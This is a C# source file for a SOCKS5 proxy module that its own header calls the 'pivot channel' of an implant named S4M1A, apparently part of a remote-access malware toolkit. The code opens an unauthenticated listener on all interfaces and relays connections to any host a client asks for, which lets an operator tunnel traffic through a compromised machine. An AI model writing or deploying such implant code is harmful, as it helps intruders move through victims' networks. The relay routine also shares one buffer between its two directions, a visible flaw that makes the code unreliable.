using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace S4M1A.Implant.Modules
{
    // =====================================================================
    //  S4M1A Socks5 v2.0 - SOCKS5 CONNECT proxy (pivot channel)
    //
    //  Contract (used by Commands.cs):
    //    Socks5.Start(int port) -> "ok" | "ERR: ..."
    //    Socks5.Stop()          -> "ok"
    //
    //  Protocol: no-auth greeting, CONNECT only (no BIND/UDP), IPv4 +
    //  domain + IPv6 destination support. 64 concurrent clients, 60 s
    //  idle timeout, 8 KB relay buffers.
    // =====================================================================

    public static class Socks5
    {
        private const int MaxClients = 64;
        private const int HandshakeTimeoutMs = 15000;
        private const int IdleTimeoutMs = 60000;

        private static TcpListener _listener;
        private static Thread _acceptThread;
        private static volatile bool _running;
        private static readonly Dictionary<int, TcpClient> _clients =
            new Dictionary<int, TcpClient>();
        private static readonly object _lock = new object();
        private static int _clientId;

        // =====================================================================
        //  Public API
        // =====================================================================

        public static string Start(int port)
        {
            Stop();
            try
            {
                _listener = new TcpListener(IPAddress.Any, port);
                _listener.Start();
                _running = true;
                _acceptThread = new Thread(AcceptLoop);
                _acceptThread.IsBackground = true;
                _acceptThread.Name = "s4m1a-socks5";
                _acceptThread.Start();
                return "ok";
            }
            catch (Exception ex)
            {
                _running = false;
                return "ERR: " + ex.Message;
            }
        }

        public static string Stop()
        {
            _running = false;
            try { if (_listener != null) _listener.Stop(); } catch { }
            _listener = null;

            TcpClient[] all;
            lock (_lock)
            {
                all = new TcpClient[_clients.Count];
                _clients.Values.CopyTo(all, 0);
                _clients.Clear();
            }
            foreach (TcpClient c in all)
            {
                try { c.Close(); } catch { }
            }

            if (_acceptThread != null && _acceptThread.IsAlive)
                _acceptThread.Join(1500);
            _acceptThread = null;
            return "ok";
        }

        // =====================================================================
        //  Accept loop
        // =====================================================================

        private static void AcceptLoop()
        {
            while (_running)
            {
                try
                {
                    TcpClient client = _listener.AcceptTcpClient();
                    int id;
                    lock (_lock)
                    {
                        if (_clients.Count >= MaxClients)
                        {
                            client.Close();
                            continue;
                        }
                        id = ++_clientId;
                        _clients[id] = client;
                    }
                    Thread t = new Thread(HandleClient);
                    t.IsBackground = true;
                    t.Start(id);
                }
                catch
                {
                    if (_running) Thread.Sleep(100);
                }
            }
        }

        // =====================================================================
        //  Client handler
        // =====================================================================

        private static void HandleClient(object o)
        {
            int id = (int)o;
            TcpClient client = null;
            TcpClient target = null;
            try
            {
                lock (_lock) { _clients.TryGetValue(id, out client); }
                if (client == null) return;

                using (NetworkStream ns = client.GetStream())
                {
                    ns.ReadTimeout = HandshakeTimeoutMs;
                    ns.WriteTimeout = HandshakeTimeoutMs;

                    // ---- greeting: ver, nmethods, methods[] ----
                    byte[] head = new byte[2];
                    if (!ReadExact(ns, head, 2)) return;
                    if (head[0] != 0x05) return;
                    byte[] methods = new byte[head[1]];
                    if (!ReadExact(ns, methods, head[1])) return;
                    ns.Write(new byte[] { 0x05, 0x00 }, 0, 2); // no-auth

                    // ---- request: ver, cmd, rsv, atyp, addr, port ----
                    byte[] req = new byte[4];
                    if (!ReadExact(ns, req, 4)) return;
                    if (req[0] != 0x05 || req[1] != 0x01) // CONNECT only
                    {
                        ns.Write(new byte[] { 0x05, 0x07, 0x00, 0x01,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, 0, 10);
                        return;
                    }

                    byte atyp = req[3];
                    string host;
                    int port;

                    if (atyp == 0x01) // IPv4
                    {
                        byte[] a4 = new byte[4];
                        if (!ReadExact(ns, a4, 4)) return;
                        host = new IPAddress(a4).ToString();
                    }
                    else if (atyp == 0x03) // domain
                    {
                        byte[] lenB = new byte[1];
                        if (!ReadExact(ns, lenB, 1)) return;
                        byte[] dom = new byte[lenB[0]];
                        if (!ReadExact(ns, dom, lenB[0])) return;
                        host = System.Text.Encoding.ASCII.GetString(dom);
                    }
                    else if (atyp == 0x04) // IPv6
                    {
                        byte[] a6 = new byte[16];
                        if (!ReadExact(ns, a6, 16)) return;
                        host = new IPAddress(a6).ToString();
                    }
                    else return;

                    byte[] portB = new byte[2];
                    if (!ReadExact(ns, portB, 2)) return;
                    port = (portB[0] << 8) | portB[1];

                    // ---- connect to target ----
                    target = new TcpClient();
                    target.Connect(host, port);
                    target.ReceiveTimeout = IdleTimeoutMs;
                    target.SendTimeout = IdleTimeoutMs;

                    // ---- success reply ----
                    ns.Write(new byte[] { 0x05, 0x00, 0x00, 0x01,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, 0, 10);

                    ns.ReadTimeout = IdleTimeoutMs;
                    ns.WriteTimeout = IdleTimeoutMs;

                    NetworkStream tn = target.GetStream();
                    Relay(ns, tn);
                }
            }
            catch { }
            finally
            {
                if (target != null) target.Close();
                if (client != null) client.Close();
                lock (_lock) { _clients.Remove(id); }
            }
        }

        // =====================================================================
        //  Bidirectional relay
        // =====================================================================

        private static void Relay(NetworkStream a, NetworkStream b)
        {
            byte[] buf = new byte[8192];
            bool closed = false;
            Exception firstErr = null;

            Thread up = new Thread(delegate()
            {
                try
                {
                    int n;
                    while (_running && (n = a.Read(buf, 0, buf.Length)) > 0)
                        b.Write(buf, 0, n);
                }
                catch (Exception ex) { firstErr = ex; }
                finally
                {
                    try { b.Close(); } catch { }
                    closed = true;
                }
            });
            Thread down = new Thread(delegate()
            {
                try
                {
                    int n;
                    while (_running && !closed &&
                           (n = b.Read(buf, 0, buf.Length)) > 0)
                        a.Write(buf, 0, n);
                }
                catch (Exception ex) { if (firstErr == null) firstErr = ex; }
                finally
                {
                    try { a.Close(); } catch { }
                }
            });

            up.IsBackground = true;
            down.IsBackground = true;
            up.Start();
            down.Start();
            up.Join();
            down.Join(3000);
        }

        private static bool ReadExact(NetworkStream ns, byte[] buf, int count)
        {
            int off = 0;
            while (off < count)
            {
                int n;
                try { n = ns.Read(buf, off, count - off); }
                catch { return false; }
                if (n <= 0) return false;
                off += n;
            }
            return true;
        }
    }
}